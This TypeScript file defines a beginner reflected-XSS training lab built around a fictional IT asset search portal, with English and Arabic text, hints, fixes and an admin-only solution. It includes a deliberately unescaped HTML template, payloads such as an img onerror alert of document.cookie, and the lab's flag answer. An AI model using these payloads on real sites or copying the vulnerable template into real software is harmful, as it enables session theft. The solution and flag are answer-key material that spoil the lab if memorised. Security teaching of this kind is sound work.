// src/modules/practice-labs/xss/labs/lab1/lab1.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const xssLab1Metadata: LabMetadata = {
  slug: 'xss-asset-search-reflect',
  title: 'XSS: IT Asset Search Reflection',
  ar_title: 'XSS انعكاسي: نظام تتبع الأصول',
  description:
    'Exploit a Reflected XSS vulnerability in an enterprise IT asset management system where search input is echoed unsafely into the HTML response.',
  ar_description:
    'استغل ثغرة XSS انعكاسية في نظام إدارة أصول IT داخلي حيث يُعكَس مدخل البحث مباشرة في استجابة HTML دون ترميز.',
  difficulty: 'BEGINNER',
  category: 'WEB_SECURITY',
  skills: ['Reflected XSS', 'HTML Injection', 'Output Encoding'],
  xpReward: 100,
  pointsReward: 50,
  duration: 20,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── للمتدرب ────────────────────────────────────────────────────
  goal: "Inject a script payload into the asset search field to simulate stealing a session cookie from the IT admin's browser.",
  ar_goal:
    'احقن payload سكريبت في حقل البحث عن الأصول لمحاكاة سرقة كوكي الجلسة من متصفح مسؤول IT.',

  briefing: {
    en: `AssetTrack — an internal IT Asset Management portal for a Fortune 500 company.
The system tracks every laptop, server, license, and network device.
The search bar lets IT staff look up any asset by ID or name.
You search for something that doesn't exist: "test123"
The page responds: "Asset 'test123' not found in inventory."
Your input. Quoted. Reflected back in the page.
The response comes from the server as raw HTML.
The query is embedded directly in that HTML — not encoded, not escaped.
You are looking at a Reflected XSS.`,
    ar: `AssetTrack — بوابة إدارة أصول IT داخلية لشركة Fortune 500.
يتتبع النظام كل لابتوب وسيرفر وترخيص وجهاز شبكة.
تتيح شريط البحث لموظفي IT البحث عن أي أصل بالـ ID أو الاسم.
تبحث عن شيء غير موجود: "test123"
تستجيب الصفحة: "الأصل 'test123' غير موجود في المستودع."
مدخلك. مقتبَس. معكوس في الصفحة.
تأتي الاستجابة من الخادم كـ HTML خام.
الاستعلام مضمَّن مباشرة في ذلك HTML — غير مرمَّز، غير مُهرَّب.
أنت تنظر إلى Reflected XSS.`,
  },

  stepsOverview: {
    en: [
      'Search for a non-existent asset — observe your input reflected in the HTML response',
      'Confirm HTML injection by searching for <b>test</b> — if it renders bold, HTML is interpreted',
      'Craft an event-based XSS payload that fires on page load',
      'Inject the payload and observe JavaScript execution',
    ],
    ar: [
      'ابحث عن أصل غير موجود — لاحظ انعكاس مدخلك في استجابة HTML',
      'أكّد حقن HTML بالبحث عن <b>test</b> — إن ظهر بخط عريض، يتم تفسير HTML',
      'صمّم payload XSS مبني على حدث يُطلَق عند تحميل الصفحة',
      'احقن الـ payload ولاحظ تنفيذ JavaScript',
    ],
  },

  // ─── للأدمن فقط ─────────────────────────────────────────────────
  solution: {
    context:
      "AssetTrack backend embeds the raw search query directly into the HTML response without any HTML encoding. The response template is: `<h2>Asset '${query}' not found in inventory</h2>`. Any HTML in the query is interpreted by the browser as markup.",
    vulnerableCode:
      '// Backend response (unsanitized):\n' +
      "const message = `Asset '${query}' not found in inventory`;\n" +
      'res.send(`<h2>${message}</h2>`);',
    exploitation:
      'GET /assets/search?q=<img src=x onerror=alert(document.cookie)> — the img tag is reflected into the HTML, the src fails, onerror fires immediately with the session cookie value.',
    steps: {
      en: [
        "GET /assets/search?q=test123 → page shows: Asset 'test123' not found — input is reflected",
        'GET /assets/search?q=<b>test</b> → if "test" appears bold, HTML injection confirmed',
        'GET /assets/search?q=<img src=x onerror=alert(1)> → image fails to load → onerror fires → alert(1) executes',
        'GET /assets/search?q=<img src=x onerror="alert(document.cookie)"> → session cookie alerted → flag returned by lab',
      ],
      ar: [
        "GET /assets/search?q=test123 → الصفحة تُظهر: الأصل 'test123' غير موجود — المدخل معكوس",
        'GET /assets/search?q=<b>test</b> → إن ظهرت "test" بخط عريض، تم تأكيد حقن HTML',
        'GET /assets/search?q=<img src=x onerror=alert(1)> → فشل تحميل الصورة → يُطلَق onerror → ينفذ alert(1)',
        'GET /assets/search?q=<img src=x onerror="alert(document.cookie)"> → تنبيه بكوكي الجلسة → يُعاد العلم من المختبر',
      ],
    },
    fix: [
      'HTML-encode all user input before embedding in HTML responses: use he.encode(query) or equivalent',
      'Use a templating engine with auto-escaping enabled (Handlebars, Jinja2 with autoescape)',
      "Apply Content Security Policy (CSP): script-src 'self' — blocks inline scripts even if injected",
      'Never use string concatenation/interpolation to build HTML from untrusted input',
    ],
  },

  postSolve: {
    explanation: {
      en: 'Reflected XSS occurs when user-supplied input is immediately echoed back in the server\'s HTML response without encoding. The browser receives a page containing the attacker\'s script, which executes in the context of the vulnerable site — with full access to cookies, localStorage, and the DOM. The attack is "reflected" because the payload travels from the request to the response in a single round-trip.',
      ar: 'يحدث الـ XSS الانعكاسي عندما يُعاد مدخل المستخدم فوراً في استجابة HTML للخادم دون ترميز. يتلقى المتصفح صفحة تحتوي على سكريبت المهاجم، والذي ينفذ في سياق الموقع الضعيف — مع وصول كامل للكوكيز وlocalStorage والـ DOM. يُسمى الهجوم "انعكاسياً" لأن الـ payload ينتقل من الطلب إلى الاستجابة في رحلة ذهاب وإياب واحدة.',
    },
    impact: {
      en: 'Session hijacking via cookie theft. Phishing via DOM manipulation. Keylogging. Credential harvesting. Malware distribution via drive-by download. In enterprise internal tools (like IT management portals), this is particularly dangerous as victims are authenticated privileged users.',
      ar: 'اختطاف الجلسة عبر سرقة الكوكيز. التصيد الاحتيالي عبر التلاعب بالـ DOM. تسجيل المفاتيح. جمع بيانات الاعتماد. توزيع البرامج الضارة عبر drive-by download. في أدوات المؤسسات الداخلية (مثل بوابات إدارة IT)، يكون هذا خطيراً بشكل خاص لأن الضحايا هم مستخدمون مصادَق عليهم ذوو صلاحيات.',
    },
    fix: [
      'Output encoding is the primary defense: encode < > " \' & before inserting in HTML',
      "CSP header: Content-Security-Policy: default-src 'self'; script-src 'self'",
      'Use frameworks that auto-escape: React JSX, Vue templates, Angular do this by default',
      'X-XSS-Protection header (legacy browsers) and SameSite cookies to reduce cookie theft impact',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 10,
      content:
        'When you search for something that doesn\'t exist, the page says "Asset [your input] not found." Your input is literally in the HTML. What happens if your input contains HTML tags?',
    },
    {
      order: 2,
      xpCost: 20,
      content:
        'Try searching for <b>test</b> — if the text appears bold in the response, HTML injection is confirmed. Now think about event-based XSS that fires without user interaction.',
    },
    {
      order: 3,
      xpCost: 30,
      content:
        'Use an image tag with an error event: <img src=x onerror=alert(1)>. The image fails to load immediately, triggering the onerror handler.',
    },
  ],

  flagAnswer: 'FLAG{XSS_REFLECT_ASSET_MGR_101}',
  initialState: {
    contents: [
      {
        title: 'Dell XPS 15 Laptop',
        body: 'hardware',
        meta: { assetId: 'HW-001', assignedTo: 'john.doe', status: 'active' },
      },
      {
        title: 'Windows Server 2022 License',
        body: 'software',
        meta: { assetId: 'SW-042', seats: 10, status: 'active' },
      },
      {
        title: 'Cisco Switch 24-Port',
        body: 'network',
        meta: {
          assetId: 'NW-007',
          location: 'Server Room B',
          status: 'maintenance',
        },
      },
    ],
  },
};
